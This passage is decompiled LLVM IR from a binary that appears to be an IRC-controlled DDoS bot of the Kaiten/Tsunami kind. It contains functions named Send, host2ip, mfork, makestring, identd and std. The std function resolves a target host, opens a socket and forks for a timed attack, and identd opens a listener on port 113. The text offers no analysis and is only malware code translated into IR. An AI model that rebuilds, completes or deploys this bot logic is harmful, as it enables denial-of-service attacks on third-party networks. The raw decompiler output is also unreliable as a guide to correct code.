  %v2_8398 = inttoptr i32 %v1_8384 to i8*
  %v3_8398 = call i32 @strwildmatch(i8* %v2_8398, i32 %v1_838c)
  %v2_83a0 = icmp ne i32 %v3_8398, 0
  %. = zext i1 %v2_83a0 to i32
  br label %dec_label_pc_83bc

dec_label_pc_83bc:                                ; preds = %dec_label_pc_8380, %dec_label_pc_8370
  %storemerge2 = phi i32 [ 1, %dec_label_pc_8370 ], [ %., %dec_label_pc_8380 ]
  br label %dec_label_pc_843c

dec_label_pc_83c8:                                ; preds = %dec_label_pc_82e0
  %v2_83cc = load i8, i8* %arg1, align 1
  %v3_83cc = zext i8 %v2_83cc to i32
  %v1_83d4 = call i32 @__GI_toupper(i32 %v3_83cc)
  store i32 %v1_83d4, i32* @r4, align 4
  %v2_83e0 = load i8, i8* %tmp, align 1
  %v3_83e0 = zext i8 %v2_83e0 to i32
  %v1_83e8 = call i32 @__GI_toupper(i32 %v3_83e0)
  %v0_83f0 = load i32, i32* @r4, align 4
  %v9_83f0 = icmp eq i32 %v0_83f0, %v1_83e8
  br i1 %v9_83f0, label %dec_label_pc_83f8, label %dec_label_pc_8434

dec_label_pc_83f8:                                ; preds = %dec_label_pc_83c8
  %v1_83fc = add i32 %tmp8, 1
  %v1_8404 = add i32 %arg2, 1
  %v2_8410 = inttoptr i32 %v1_83fc to i8*
  %v3_8410 = call i32 @strwildmatch(i8* %v2_8410, i32 %v1_8404)
  %v2_8418 = icmp ne i32 %v3_8410, 0
  %.7 = zext i1 %v2_8418 to i32
  br label %dec_label_pc_8434

dec_label_pc_8434:                                ; preds = %dec_label_pc_83f8, %dec_label_pc_83c8
  %storemerge = phi i32 [ 1, %dec_label_pc_83c8 ], [ %.7, %dec_label_pc_83f8 ]
  br label %dec_label_pc_843c

dec_label_pc_843c:                                ; preds = %dec_label_pc_83bc, %dec_label_pc_8364, %dec_label_pc_82f0, %dec_label_pc_8434
  %stack_var_-44.0 = phi i32 [ %storemerge3, %dec_label_pc_8364 ], [ %storemerge2, %dec_label_pc_83bc ], [ %v3_82f4, %dec_label_pc_82f0 ], [ %storemerge, %dec_label_pc_8434 ]
  store i32 %v3_82a8, i32* @r4, align 4
  store i32 %v6_82a8, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32)* @__GI_toupper, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_843c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8364, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_844c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_844c, i32* @ip, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8454 = load i32, i32* @fp, align 4
  store i32 33884, i32* %stack_var_-16, align 4
  %v2_8458 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8458, i32* @fp, align 4
  %v4_8468 = ptrtoint i32* %stack_var_-8 to i32
  store i32 ptrtoint (i8** @global_var_1e800.281 to i32), i32* @r0, align 4
  %v4_847c = call i32 @vsprintf(i32 ptrtoint (i8** @global_var_1e800.281 to i32), i32 %arg2, i32 %v4_8468)
  %v3_8484 = call i32 @strlen(i8* bitcast (i8** @global_var_1e800.281 to i8*))
  store i32 %v3_8484, i32* @r2, align 4
  %v4_8498 = call i32 @__libc_write(i32 %arg1, i32* bitcast (i8** @global_var_1e800.281 to i32*))
  store i32 %v3_8454, i32* @fp, align 4
  ret i32 %v4_8498

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @host2ip(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_84b4 = load i32, i32* @fp, align 4
  store i32 33980, i32* %stack_var_-4, align 4
  %v2_84b8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_84b8, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  store i32 %arg2, i32* @r0, align 4
  %v1_84cc = call i32 @inet_addr(i32 %arg2)
  store i32 %v1_84cc, i32* @global_var_1ec00.283, align 4
  %v3_84e4 = icmp eq i32 %v1_84cc, -1
  br i1 %v3_84e4, label %dec_label_pc_84ec, label %dec_label_pc_8534

dec_label_pc_84ec:                                ; preds = %entry
  %v3_84ec = load i32, i32* %stack_var_-28, align 4
  %v1_84f0 = call i32 @__GI_gethostbyname(i32 %v3_84ec)
  %v2_8500 = icmp eq i32 %v1_84f0, 0
  br i1 %v2_8500, label %dec_label_pc_8508, label %dec_label_pc_8510

dec_label_pc_8508:                                ; preds = %dec_label_pc_84ec
  %v1_850c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8510

dec_label_pc_8510:                                ; preds = %dec_label_pc_84ec, %dec_label_pc_8508
  %v1_8514 = add i32 %v1_84f0, 16
  %v2_8514 = inttoptr i32 %v1_8514 to i32*
  %v3_8514 = load i32, i32* %v2_8514, align 4
  %v1_8518 = inttoptr i32 %v3_8514 to i32*
  %v2_8518 = load i32, i32* %v1_8518, align 4
  %v1_8524 = add i32 %v1_84f0, 12
  %v2_8524 = inttoptr i32 %v1_8524 to i32*
  %v3_8524 = load i32, i32* %v2_8524, align 4
  store i32 %v3_8524, i32* @r2, align 4
  %v3_8530 = call i32 @bcopy(i32 %v2_8518, i32 ptrtoint (i32* @global_var_1ec00.283 to i32), i32 %v3_8524)
  %v2_8538.pre = load i32, i32* @global_var_1ec00.283, align 4
  br label %dec_label_pc_8534

dec_label_pc_8534:                                ; preds = %entry, %dec_label_pc_8510
  %v2_8538 = phi i32 [ %v1_84cc, %entry ], [ %v2_8538.pre, %dec_label_pc_8510 ]
  store i32 %v3_84b4, i32* @fp, align 4
  ret i32 %v2_8538

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_1ec00.283, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8534, { 1, 0 }
  uselistorder label %dec_label_pc_8510, { 1, 0 }
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %v2_8564 = load i8, i8* bitcast (i8** @global_var_1e7f0.285 to i8*), align 4
  %v7_8568 = icmp eq i8 %v2_8564, 1
  br i1 %v7_8568, label %dec_label_pc_8570, label %dec_label_pc_857c

dec_label_pc_8570:                                ; preds = %entry
  br label %dec_label_pc_8680

dec_label_pc_857c:                                ; preds = %entry
  %v0_857c = call i32 @__libc_fork()
  %v2_858c = icmp eq i32 %v0_857c, 0
  br i1 %v2_858c, label %dec_label_pc_8594, label %dec_label_pc_85a0

dec_label_pc_8594:                                ; preds = %dec_label_pc_857c
  br label %dec_label_pc_8680

dec_label_pc_85a0:                                ; preds = %dec_label_pc_857c
  %v2_85a4 = load i32, i32* @global_var_1e7fc.287, align 4
  %v1_85a8 = add i32 %v2_85a4, 1
  store i32 %v1_85a8, i32* @global_var_1e7fc.287, align 4
  %v3_85bc = mul i32 %v1_85a8, 4
  %v1_85c0 = add i32 %v3_85bc, 4
  %v1_85c8 = call i32 @malloc(i32 %v1_85c0)
  %v2_862412 = load i32, i32* @global_var_1e7fc.287, align 4
  %v9_863014 = icmp eq i32 %v2_862412, 1
  br i1 %v9_863014, label %dec_label_pc_8638, label %dec_label_pc_85e0

dec_label_pc_85e0:                                ; preds = %dec_label_pc_85a0, %dec_label_pc_85e0
  %storemerge116 = phi i32 [ %v1_8618, %dec_label_pc_85e0 ], [ 0, %dec_label_pc_85a0 ]
  %v3_85e4 = mul i32 %storemerge116, 4
  %v2_85f0 = add i32 %v3_85e4, %v1_85c8
  %v2_8604 = load i32, i32* @global_var_20e74.289, align 4
  %v2_8608 = add i32 %v2_8604, %v3_85e4
  %v1_860c = inttoptr i32 %v2_8608 to i32*
  %v2_860c = load i32, i32* %v1_860c, align 4
  %v2_8610 = inttoptr i32 %v2_85f0 to i32*
  store i32 %v2_860c, i32* %v2_8610, align 4
  %v1_8618 = add i32 %storemerge116, 1
  %v2_8624 = load i32, i32* @global_var_1e7fc.287, align 4
  %v1_8628 = add i32 %v2_8624, -1
  %tmp = icmp ugt i32 %v1_8628, %v1_8618
  br i1 %tmp, label %dec_label_pc_85e0, label %dec_label_pc_8620.dec_label_pc_8638_crit_edge

dec_label_pc_8620.dec_label_pc_8638_crit_edge:    ; preds = %dec_label_pc_85e0
  br label %dec_label_pc_8638

dec_label_pc_8638:                                ; preds = %dec_label_pc_85a0, %dec_label_pc_8620.dec_label_pc_8638_crit_edge
  %v2_8624.lcssa = phi i32 [ %v2_8624, %dec_label_pc_8620.dec_label_pc_8638_crit_edge ], [ %v2_862412, %dec_label_pc_85a0 ]
  %v3_8640 = mul i32 %v2_8624.lcssa, 4
  %v2_864c = add i32 %v1_85c8, -4
  %v1_8650 = add i32 %v2_864c, %v3_8640
  %v2_8658 = inttoptr i32 %v1_8650 to i32*
  store i32 %v0_857c, i32* %v2_8658, align 4
  %v2_8660 = load i32, i32* @global_var_20e74.289, align 4
  store i32 %v2_8660, i32* @r0, align 4
  %v0_8668 = call i32 @free()
  store i32 %v1_85c8, i32* @global_var_20e74.289, align 4
  br label %dec_label_pc_8680

dec_label_pc_8680:                                ; preds = %dec_label_pc_8594, %dec_label_pc_8570, %dec_label_pc_8638
  %v3_8680 = phi i32 [ 0, %dec_label_pc_8594 ], [ 1, %dec_label_pc_8570 ], [ %v0_857c, %dec_label_pc_8638 ]
  ret i32 %v3_8680

; uselistorder directives
  uselistorder i32 %v3_85e4, { 1, 0 }
  uselistorder i32 %storemerge116, { 1, 0 }
  uselistorder i32 %v2_862412, { 1, 0 }
  uselistorder i32 %v1_85c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8680, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8638, { 1, 0 }
  uselistorder label %dec_label_pc_85e0, { 1, 0 }
}

define i32 @filter(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_869c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_869c, i32* @ip, align 4
  store i8* %arg1, i8** %stack_var_-20, align 4
  br label %dec_label_pc_86d8

dec_label_pc_86b4:                                ; preds = %dec_label_pc_8700, %dec_label_pc_86d8
  %v3_86b4 = phi i8* [ %v3_8710, %dec_label_pc_8700 ], [ %v3_86e8, %dec_label_pc_86d8 ]
  %v3_86b8 = call i32 @strlen(i8* %v3_86b4)
  %v3_86c4 = load i8*, i8** %stack_var_-20, align 4
  %v4_86c4 = ptrtoint i8* %v3_86c4 to i32
  %v2_86c8 = add i32 %v3_86b8, -1
  %v1_86cc = add i32 %v2_86c8, %v4_86c4
  %v3_86d4 = inttoptr i32 %v1_86cc to i8*
  store i8 0, i8* %v3_86d4, align 1
  %v3_86d8.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_86d8

dec_label_pc_86d8:                                ; preds = %entry, %dec_label_pc_86b4
  %v3_86d8 = phi i8* [ %arg1, %entry ], [ %v3_86d8.pre, %dec_label_pc_86b4 ]
  %v3_86dc = call i32 @strlen(i8* %v3_86d8)
  %v3_86e8 = load i8*, i8** %stack_var_-20, align 4
  %v4_86e8 = ptrtoint i8* %v3_86e8 to i32
  %v2_86ec = add i32 %v3_86dc, -1
  %v1_86f0 = add i32 %v2_86ec, %v4_86e8
  %v1_86f4 = inttoptr i32 %v1_86f0 to i8*
  %v2_86f4 = load i8, i8* %v1_86f4, align 1
  %v7_86f8 = icmp eq i8 %v2_86f4, 13
  br i1 %v7_86f8, label %dec_label_pc_86b4, label %dec_label_pc_8700

dec_label_pc_8700:                                ; preds = %dec_label_pc_86d8
  %v3_8704 = call i32 @strlen(i8* %v3_86e8)
  %v3_8710 = load i8*, i8** %stack_var_-20, align 4
  %v4_8710 = ptrtoint i8* %v3_8710 to i32
  %v2_8714 = add i32 %v3_8704, -1
  %v1_8718 = add i32 %v2_8714, %v4_8710
  %v1_871c = inttoptr i32 %v1_8718 to i8*
  %v2_871c = load i8, i8* %v1_871c, align 1
  %v7_8720 = icmp eq i8 %v2_871c, 10
  br i1 %v7_8720, label %dec_label_pc_86b4, label %dec_label_pc_8728

dec_label_pc_8728:                                ; preds = %dec_label_pc_8700
  ret i32 %v3_8704

; uselistorder directives
  uselistorder i8* %v3_8710, { 1, 0 }
  uselistorder i8* %v3_86e8, { 1, 2, 0 }
  uselistorder i8** %stack_var_-20, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_86d8, { 1, 0 }
}

define i32 @makestring(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-1068 = alloca i32, align 4
  %v3_8730 = load i32, i32* @r4, align 4
  %v6_8730 = load i32, i32* @fp, align 4
  %v2_873c = ptrtoint i32* %stack_var_-1068 to i32
  %v0_8740 = call i32 @random()
  %v2_8750 = srem i32 %v0_8740, 5
  %v1_8758 = add nsw i32 %v2_8750, 4
  %v1_8764 = add nsw i32 %v2_8750, 5
  %v1_876c = call i32 @malloc(i32 %v1_8764)
  store i32 %v1_8764, i32* @r2, align 4
  %v2_8790 = inttoptr i32 %v1_876c to i8*
  %v3_8790 = call i32 @__GI_memset(i8* %v2_8790, i32 0)
  store i32 ptrtoint ([16 x i8]* @global_var_13e84.291 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_13e94.293 to i32), i32* @r1, align 4
  %v3_879c = call i32 @__GI_fopen(i32 ptrtoint ([16 x i8]* @global_var_13e84.291 to i32), i32 ptrtoint (i32* @global_var_13e94.293 to i32))
  %v2_87ac = icmp eq i32 %v3_879c, 0
  br i1 %v2_87ac, label %dec_label_pc_8804.preheader, label %dec_label_pc_8818

dec_label_pc_8804.preheader:                      ; preds = %entry
  %v5_881022 = icmp sgt i32 %v2_8750, -4
  br i1 %v5_881022, label %dec_label_pc_87c0, label %dec_label_pc_88f4

dec_label_pc_87c0:                                ; preds = %dec_label_pc_8804.preheader, %dec_label_pc_87c0
  %storemerge323 = phi i32 [ %v1_87fc, %dec_label_pc_87c0 ], [ 0, %dec_label_pc_8804.preheader ]
  %v2_87cc = add i32 %storemerge323, %v1_876c
  store i32 %v2_87cc, i32* @r4, align 4
  %v0_87d0 = call i32 @random()
  %v2_87e0 = srem i32 %v0_87d0, 26
  %fold = add nsw i32 %v2_87e0, 65
  %v1_87f4 = trunc i32 %fold to i8
  %v2_87f4 = load i32, i32* @r4, align 4
  %v3_87f4 = inttoptr i32 %v2_87f4 to i8*
  store i8 %v1_87f4, i8* %v3_87f4, align 1
  %v1_87fc = add nuw nsw i32 %storemerge323, 1
  %v5_8810 = icmp slt i32 %v1_87fc, %v1_8758
  br i1 %v5_8810, label %dec_label_pc_87c0, label %dec_label_pc_88f4

dec_label_pc_8818:                                ; preds = %entry
  %v0_8818 = call i32 @random()
  store i32 %v0_8818, i32* @r4, align 4
  %v0_8820 = call i32 @random()
  %v0_8828 = load i32, i32* @r4, align 4
  %v2_8828 = mul i32 %v0_8828, %v0_8820
  %v2_8838 = srem i32 %v2_8828, 45402
  %v5_888430 = icmp slt i32 %v2_8838, 0
  br i1 %v5_888430, label %dec_label_pc_8888, label %dec_label_pc_8854

dec_label_pc_8854:                                ; preds = %dec_label_pc_8818, %dec_label_pc_8854
  %storemerge231 = phi i32 [ %v1_8870, %dec_label_pc_8854 ], [ 0, %dec_label_pc_8818 ]
  %v3_8868 = call i32 @fgets(i32 %v2_873c, i32 1024, i32 %v3_879c)
  %v1_8870 = add nuw nsw i32 %storemerge231, 1
  %v5_8884 = icmp slt i32 %storemerge231, %v2_8838
  br i1 %v5_8884, label %dec_label_pc_8854, label %dec_label_pc_8888

dec_label_pc_8888:                                ; preds = %dec_label_pc_8854, %dec_label_pc_8818
  store i32 1024, i32* @r2, align 4
  %v2_889c = bitcast i32* %stack_var_-1068 to i8*
  %v3_889c = call i32 @__GI_memset(i8* %v2_889c, i32 0)
  %v3_88b4 = call i32 @fgets(i32 %v2_873c, i32 1024, i32 %v3_879c)
  %v2_88c4 = call i32 @filter(i8* %v2_889c)
  store i32 %v1_876c, i32* @r0, align 4
  store i32 %v2_873c, i32* @r1, align 4
  store i32 %v1_8758, i32* @r2, align 4
  %v0_88e8 = call i32 @memcpy()
  %v1_88f0 = inttoptr i32 %v3_879c to i8*
  %v2_88f0 = call i32 @__GI_fclose(i8* %v1_88f0)
  br label %dec_label_pc_88f4

dec_label_pc_88f4:                                ; preds = %dec_label_pc_8804.preheader, %dec_label_pc_87c0, %dec_label_pc_8888
  store i32 %v3_8730, i32* @r4, align 4
  store i32 %v6_8730, i32* @fp, align 4
  ret i32 %v1_876c

; uselistorder directives
  uselistorder i32 %v1_87fc, { 1, 0 }
  uselistorder i32 %v1_876c, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_88f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8854, { 1, 0 }
  uselistorder label %dec_label_pc_87c0, { 1, 0 }
}

define i32 @identd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1108 = alloca i32, align 4
  %stack_var_-1236 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_8910 = load i32, i32* @fp, align 4
  store i32 %v3_8910, i32* %stack_var_-16, align 4
  store i32 35096, i32* %stack_var_-4, align 4
  %v13_8910 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8914 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8914, i32* @fp, align 4
  %v0_892c = call i32 @socket()
  %v7_893c = icmp eq i32 %v0_892c, -1
  br i1 %v7_893c, label %dec_label_pc_8cdc, label %dec_label_pc_8944

dec_label_pc_8944:                                ; preds = %entry
  %v1_8958 = call i32 @htons(i32 113)
  %v0_899c = call i32 @bind()
  %v7_89a4 = icmp eq i32 %v0_899c, -1
  br i1 %v7_89a4, label %dec_label_pc_8cdc, label %dec_label_pc_89ac

dec_label_pc_89ac:                                ; preds = %dec_label_pc_8944
  %v0_89b4 = call i32 @listen()
  %v7_89bc = icmp eq i32 %v0_89b4, -1
  br i1 %v7_89bc, label %dec_label_pc_8cdc, label %dec_label_pc_89c4

dec_label_pc_89c4:                                ; preds = %dec_label_pc_89ac
  %v0_89c4 = call i32 @__libc_fork()
  %v2_89cc = icmp eq i32 %v0_89c4, 0
  br i1 %v2_89cc, label %dec_label_pc_8cdc, label %dec_label_pc_89d4

dec_label_pc_89d4:                                ; preds = %dec_label_pc_89c4
  store i32 16, i32* %stack_var_-44, align 4
  %v2_89dc = ptrtoint i32* %stack_var_-76 to i32
  %v2_89e0 = ptrtoint i32* %stack_var_-44 to i32
  %v5_89ec = bitcast i32* %stack_var_-76 to %sockaddr*
  %v6_89ec = call i32 @__libc_accept(i32 %v0_892c, %sockaddr* %v5_89ec, i32 %v2_89e0, i32 %v2_89dc, i32 16)
  %v2_89fc = add i32 %v6_89ec, 1
  %v3_89fc = icmp eq i32 %v6_89ec, -1
  br i1 %v3_89fc, label %dec_label_pc_8a04, label %dec_label_pc_8a0c.preheader

dec_label_pc_8a04:                                ; preds = %dec_label_pc_89d4
  %v1_8a08 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8a0c.preheader

dec_label_pc_8a0c.preheader:                      ; preds = %dec_label_pc_8a04, %dec_label_pc_89d4
  %v2_8a14 = ptrtoint i32* %stack_var_-1236 to i32
  %v3_8a54 = udiv i32 %v6_89ec, 32
  %v3_8a68 = mul nuw nsw i32 %v3_8a54, 4
  %v2_8a70 = add i32 %v3_8a68, %v13_8910
  %v1_8a80 = urem i32 %v6_89ec, 32
  %v6_8a88 = shl i32 1, %v1_8a80
  %v2_8ad8 = ptrtoint i32* %stack_var_-1108 to i32
  %v2_8b24 = add i32 %v2_8a70, -1220
  %v1_8b28 = inttoptr i32 %v2_8b24 to i32*
  br label %dec_label_pc_8a28.lr.ph

dec_label_pc_8a28.lr.ph:                          ; preds = %dec_label_pc_8b08, %dec_label_pc_8a0c.preheader
  br label %dec_label_pc_8a28

dec_label_pc_8a28:                                ; preds = %dec_label_pc_8a28.lr.ph, %dec_label_pc_8a28
  %storemerge26 = phi i32 [ 0, %dec_label_pc_8a28.lr.ph ], [ %v1_8a3c, %dec_label_pc_8a28 ]
  %v5_8a34 = mul nuw nsw i32 %storemerge26, 4
  %v6_8a34 = add i32 %v5_8a34, %v2_8a14
  %v7_8a34 = inttoptr i32 %v6_8a34 to i32*
  store i32 0, i32* %v7_8a34, align 4
  %v1_8a3c = add nuw nsw i32 %storemerge26, 1
  %tmp37 = icmp ult i32 %v1_8a3c, 32
  br i1 %tmp37, label %dec_label_pc_8a28, label %dec_label_pc_8a50

dec_label_pc_8a50:                                ; preds = %dec_label_pc_8a28
  %v2_8a78 = load i32, i32* %v1_8b28, align 4
  %v2_8a8c = or i32 %v2_8a78, %v6_8a88
  store i32 %v2_8a8c, i32* %v1_8b28, align 4
  store i32 60, i32* %stack_var_-1108, align 4
  %v5_8af0 = call i32 @__libc_select(i32 %v2_89fc, i32 %v2_8a14, i32 0, i32 0, i32 %v2_8ad8)
  %v1_8af8 = icmp slt i32 %v5_8af0, 0
  br i1 %v1_8af8, label %dec_label_pc_8b00, label %dec_label_pc_8b08

dec_label_pc_8b00:                                ; preds = %dec_label_pc_8a50
  %v1_8b04 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8b08

dec_label_pc_8b08:                                ; preds = %dec_label_pc_8a50, %dec_label_pc_8b00
  %v2_8b28 = load i32, i32* %v1_8b28, align 4
  %v6_8b341 = lshr i32 %v2_8b28, %v1_8a80
  %v1_8b3c = urem i32 %v6_8b341, 2
  %v2_8b40 = icmp eq i32 %v1_8b3c, 0
  br i1 %v2_8b40, label %dec_label_pc_8a28.lr.ph, label %dec_label_pc_8b4c

dec_label_pc_8b4c:                                ; preds = %dec_label_pc_8b08
  %v2_8b54 = ptrtoint i32* %stack_var_-1100 to i32
  %v5_8b68 = call i32 @__libc_recv(i32 %v6_89ec, i32* nonnull %stack_var_-1100, i32 1024, i32 0)
  %tmp38 = icmp slt i32 %v5_8b68, 1
  br i1 %tmp38, label %dec_label_pc_8b8c, label %dec_label_pc_8b80

dec_label_pc_8b80:                                ; preds = %dec_label_pc_8b4c
  %v7_8b88 = icmp slt i32 %v5_8b68, 20
  br i1 %v7_8b88, label %dec_label_pc_8b94, label %dec_label_pc_8b8c

dec_label_pc_8b8c:                                ; preds = %dec_label_pc_8b80, %dec_label_pc_8b4c
  %v1_8b90 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8b94

dec_label_pc_8b94:                                ; preds = %dec_label_pc_8b80, %dec_label_pc_8b8c
  %v2_8ba4 = add i32 %v13_8910, -1084
  %v2_8ba8 = add i32 %v2_8ba4, %v5_8b68
  %v3_8bb0 = inttoptr i32 %v2_8ba8 to i8*
  store i8 0, i8* %v3_8bb0, align 1
  %v1_8bb8 = add i32 %v13_8910, -1
  %v2_8bc8 = add i32 %v1_8bb8, %v5_8b68
  %v2_8bcc = add i32 %v2_8bc8, -1084
  %v1_8bd0 = inttoptr i32 %v2_8bcc to i8*
  %v2_8bd0 = load i8, i8* %v1_8bd0, align 1
  %v7_8bd4 = icmp eq i8 %v2_8bd0, 10
  br i1 %v7_8bd4, label %dec_label_pc_8c04, label %dec_label_pc_8bdc

dec_label_pc_8bdc:                                ; preds = %dec_label_pc_8b94
  %v2_8bf8 = load i8, i8* %v1_8bd0, align 1
  %v7_8bfc = icmp eq i8 %v2_8bf8, 13
  br i1 %v7_8bfc, label %dec_label_pc_8c04, label %dec_label_pc_8c28

dec_label_pc_8c04:                                ; preds = %dec_label_pc_8bdc, %dec_label_pc_8b94
  store i8 0, i8* %v1_8bd0, align 1
  br label %dec_label_pc_8c28

dec_label_pc_8c28:                                ; preds = %dec_label_pc_8bdc, %dec_label_pc_8c04
  %v1_8c2c = add i32 %v13_8910, -2
  %v2_8c3c = add i32 %v1_8c2c, %v5_8b68
  %v2_8c40 = add i32 %v2_8c3c, -1084
  %v1_8c44 = inttoptr i32 %v2_8c40 to i8*
  %v2_8c44 = load i8, i8* %v1_8c44, align 1
  %v7_8c48 = icmp eq i8 %v2_8c44, 10
  br i1 %v7_8c48, label %dec_label_pc_8c78, label %dec_label_pc_8c50

dec_label_pc_8c50:                                ; preds = %dec_label_pc_8c28
  %v2_8c6c = load i8, i8* %v1_8c44, align 1
  %v7_8c70 = icmp eq i8 %v2_8c6c, 13
  br i1 %v7_8c70, label %dec_label_pc_8c78, label %dec_label_pc_8c9c

dec_label_pc_8c78:                                ; preds = %dec_label_pc_8c50, %dec_label_pc_8c28
  store i8 0, i8* %v1_8c44, align 1
  br label %dec_label_pc_8c9c

dec_label_pc_8c9c:                                ; preds = %dec_label_pc_8c50, %dec_label_pc_8c78
  %v4_8cc0 = call i32 @Send(i32 %v6_89ec, i32 ptrtoint ([25 x i8]* @global_var_13e98.297 to i32), i32 %v2_8b54)
  %v1_8cc8 = call i32 @__libc_close(i32 %v6_89ec)
  %v1_8cd0 = call i32 @__libc_close(i32 %v0_892c)
  %v1_8cd8 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8cdc

dec_label_pc_8cdc:                                ; preds = %dec_label_pc_89c4, %dec_label_pc_89ac, %dec_label_pc_8944, %entry, %dec_label_pc_8c9c
  %v9_8ce0 = phi i32 [ 0, %dec_label_pc_89c4 ], [ %v0_89b4, %dec_label_pc_89ac ], [ %v0_899c, %dec_label_pc_8944 ], [ %v0_892c, %entry ], [ %v1_8cd8, %dec_label_pc_8c9c ]
  ret i32 %v9_8ce0

; uselistorder directives
  uselistorder i8* %v1_8c44, { 1, 0, 2 }
  uselistorder i8* %v1_8bd0, { 1, 0, 2 }
  uselistorder i32 %storemerge26, { 1, 0 }
  uselistorder i32* %v1_8b28, { 2, 0, 1 }
  uselistorder i32 %v1_8a80, { 1, 0 }
  uselistorder i32 %v2_8a14, { 1, 0 }
  uselistorder i32 %v6_89ec, { 2, 3, 4, 1, 0, 6, 5 }
  uselistorder i32 %v0_89b4, { 1, 0 }
  uselistorder i32 %v0_899c, { 1, 0 }
  uselistorder i32 %v0_892c, { 1, 2, 3, 0 }
  uselistorder i32 %v13_8910, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32 -1084, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8cdc, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8c9c, { 1, 0 }
  uselistorder label %dec_label_pc_8c28, { 1, 0 }
  uselistorder label %dec_label_pc_8b94, { 1, 0 }
  uselistorder label %dec_label_pc_8b08, { 1, 0 }
  uselistorder label %dec_label_pc_8a28, { 1, 0 }
}

define i32 @std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 36088, i32* %stack_var_-4, align 4
  %v2_8cf4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8cf4, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-68, align 4
  %v8_8d14 = icmp sgt i32 %arg3, 2
  br i1 %v8_8d14, label %dec_label_pc_8d20, label %dec_label_pc_8d18

dec_label_pc_8d18:                                ; preds = %entry
  %v1_8d1c = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8d20

dec_label_pc_8d20:                                ; preds = %entry, %dec_label_pc_8d18
  %v0_8d2c = call i32 @socket()
  %v2_8d3c = call i32 @__GI_time(i32* null)
  %v3_8d48 = load i32, i32* %stack_var_-68, align 4
  %v1_8d4c = add i32 %v3_8d48, 12
  %v1_8d50 = inttoptr i32 %v1_8d4c to i32*
  %v2_8d50 = load i32, i32* %v1_8d50, align 4
  store i32 %v2_8d50, i32* @r0, align 4
  %v1_8d58 = call i32 @atol(i32 %v2_8d50)
  %v1_8d68 = call i32 @mfork(i32 %arg2)
  %v2_8d70 = icmp eq i32 %v1_8d68, 0
  br i1 %v2_8d70, label %dec_label_pc_8d78, label %dec_label_pc_8ea4

dec_label_pc_8d78:                                ; preds = %dec_label_pc_8d20
  %v3_8d78 = load i32, i32* %stack_var_-68, align 4
  %v1_8d7c = add i32 %v3_8d78, 4
  %v1_8d80 = inttoptr i32 %v1_8d7c to i32*
  %v2_8d80 = load i32, i32* %v1_8d80, align 4
  %v1_8d88 = call i32 @__GI_gethostbyname(i32 %v2_8d80)
  store i32 16, i32* @r2, align 4
  %v2_8da4 = bitcast i32* %stack_var_-52 to i8*
  %v3_8da4 = call i32 @__GI_memset(i8* %v2_8da4, i32 0)
  %v1_8dac = add i32 %v1_8d88, 16
  %v2_8dac = inttoptr i32 %v1_8dac to i32*
  %v3_8dac = load i32, i32* %v2_8dac, align 4
  %v1_8db0 = inttoptr i32 %v3_8dac to i32*
  %v2_8db0 = load i32, i32* %v1_8db0, align 4
